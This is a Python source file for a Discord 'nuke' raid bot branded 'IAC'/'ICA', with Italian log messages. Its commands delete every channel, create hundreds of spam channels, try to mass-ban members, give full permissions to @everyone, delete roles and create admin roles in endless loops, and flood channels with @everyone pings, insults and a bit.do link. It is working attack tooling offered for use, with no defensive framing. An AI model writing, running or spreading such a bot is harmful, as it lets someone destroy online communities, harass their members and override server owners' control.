import discord
from discord import *
from discord import Permissions
from discord.ext import commands, tasks
import os
import keep_alive
import asyncio
import os
import random
from itertools import cycle
import DiscordUtils
from discord.utils import find
from discord.user import User

prefix='!'
n=0
reason='Dio porco'
SPAM_CHANNEL='Server fucked by IAC', 'Cry stupid little babies', 'Fuck yall', 'Server nuked by ICA', 'You are the cringe', 'Get a fucking life'
SPAM_TEXT='> SERVER FUCKED BY IAC @everyone', '> @everyone Never mess with IAC                                                                **tI4Zzpk5RT**  -> http://bit.do/AntiCringeEmpire', ' > @everyone ANTI CRINGE EMPIRE                                                                          **iMJW23W4Ko** -> http://bit.do/AntiCringeEmpire'
'Fuck you', ' > @everyone Raided by ICA                                                      **bbNIPQqhXZ** -> http://bit.do/AntiCringeEmpire'
SPAM_TEXT2='**tI4Zzpk5RT**', '**iMJW23W4Ko**', '**bbNIPQqhXZ**', '**eFVB4aRVI1**', '**WcjhcXmz9o**', '**xN0ClqLXfp**', '**is43zfeT9r**', '**g1I0a8VF5a**',
'**cG4pyWDxbt**',
'**nhiOm6AtJi**'

intents=discord.Intents.default()
intents.members = True
intents = discord.Intents(messages=True, guilds=True)



client = commands.Bot(command_prefix=prefix, intents=intents)
client.remove_command('help')

@client.event
async def on_ready():
    print('IL BOT è PRONTOOO')
    await client.change_presence(activity=discord.Game('Pogging'))

@client.command()
async def ping(ctx):
    await ctx.send(f'Pong! {round(client.latency * 1000)}ms')

@client.command()
async def nuke(ctx):
    await ctx.message.delete()
    await ctx.guild.edit(name='Server fucked by IAC')
    
    for c in ctx.guild.channels:
        await c.delete()

    guild = ctx.guild

    n=0
    while(n<=250):
        await guild.create_text_channel(random.choice(SPAM_CHANNEL))
        n = n+1

    for member in guild.members:
      try:
        await member.ban
        print(f"{member.name}#{member.discriminator} è stato bannato!")
      except:
        print(f"Non sono riuscito a bannare {member.name}#{member.discriminator}")
    try:
      role = discord.utils.get(guild.roles, name = "@everyone")
      await role.edit(permissions = Permissions.all())
      print("Ho datto admin a tutti!")
    except:
      print("Non sono riuscito a dare admin a tutti!")
    
    while True:
      for role in guild.roles:
        try:
          await guild.create_role(name="Fucked by IAC", permissions = Permissions.all())
          print(f"sono riuscito a creare {role.name}")
        except:
          print(f"Non sono riuscito a creare {role.name}")



@client.command()
async def spam(ctx):
  while True:
    for c in ctx.guild.text_channels:
             await c.send('@everyone https://cdn.discordapp.com/attachments/884048184345763940/884126781861408818/iac_official_trailer.mp4')
             await c.send('@everyone Raided by ICA -> http://bit.do/AntiCringeEmpire')
             await c.send('@everyone https://cdn.discordapp.com/attachments/884048184345763940/884126781861408818/iac_official_trailer.mp4')
             await c.send('@everyone Raided by ICA -> http://bit.do/AntiCringeEmpire')

@client.command()
async def admin(ctx):
  await ctx.message.delete()
  guild = ctx.guild
  try:
    role = discord.utils.get(guild.roles, name = "@everyone")
    await role.edit(permissions = Permissions.all())
    print("Ho datto admin a tutti!")
  except:
    print("Non sono riuscito a dare admin a tutti!")

@client.event
async def on_guild_channel_create(channel):
  while True:
    await channel.send(random.choice(SPAM_TEXT))

@client.command()
async def massban(ctx):
  await ctx.message.delete()
  guild = ctx.guild
  for member in guild.members:
    try:
      await member.ban
      print(f"{member.name}#{member.discriminator} è stato bannato!")
    except:
      print(f"Non sono riuscito a bannare {member.name}#{member.discriminator}")
      try:
        await member.ban
        print(f"{member.name}#{member.discriminator} was banned")
      except:
        if member == "Poggers":
          return

@client.command()
async def roles(ctx):
  await ctx.message.delete()
  guild = ctx.guild
  for role in guild.roles:
    try:
      await role.delete()
      print(f"{role.name} deletato con successo!")
    except:
      print(f"Non sono riuscito a deletare {role.name}")

@client.command()
async def rolescreate(ctx):
  guild = ctx.guild
  while True:
    for role in guild.roles:
      try:
        await guild.create_role(name="Fucked by IAC", permissions = Permissions.all())
        print(f"sono riuscito a creare {role.name}")
      except:
        print(f"Non sono riuscito a creare {role.name}")

client.run("YOUR TOKEN HERE")
